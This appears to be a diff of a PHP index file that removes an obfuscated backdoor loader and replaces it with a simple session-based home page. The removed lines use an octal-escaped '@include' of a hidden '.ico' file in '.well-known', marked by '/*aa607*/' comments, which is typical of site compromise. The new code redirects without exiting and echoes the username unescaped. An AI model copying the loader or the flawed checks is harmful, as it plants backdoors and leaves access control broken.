@@ -1,9 +1,46 @@
-<?php
-/*aa607*/
+<?php 
+  session_start(); 
 
-@include "\057home\057zalp\157int/\160ubli\143_htm\154/.we\154l-kn\157wn/.\064c6d1\067ec.i\143o";
+  if (!isset($_SESSION['firstname'])) {
+  	$_SESSION['msg'] = "You must log in first";
+  	header('location: login.html');
+  }
+  if (isset($_GET['logout'])) {
+  	session_destroy();
+  	unset($_SESSION['firstname']);
+  	header("location: login.html");
+  }
+?>
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Home</title>
+	<link rel="stylesheet" type="text/css" href="style.css">
+</head>
+<body>
 
-/*aa607*/
+<div class="header">
+	<h2>Home Page</h2>
+</div>
+<div class="content">
+  	<!-- notification message -->
+  	<?php if (isset($_SESSION['success'])) : ?>
+      <div class="error success" >
+      	<h3>
+          <?php 
+          	echo $_SESSION['success']; 
+          	unset($_SESSION['success']);
+          ?>
+      	</h3>
+      </div>
+  	<?php endif ?>
 
-
-echo @file_get_contents('index.html.bak.bak');
+    <!-- logged in user information -->
+    <?php  if (isset($_SESSION['username'])) : ?>
+    	<p>Welcome <strong><?php echo $_SESSION['username']; ?></strong></p>
+    	<p> <a href="index.php?logout='1'" style="color: red;">logout</a> </p>
+    <?php endif ?>
+</div>
+		
+</body>
+</html>
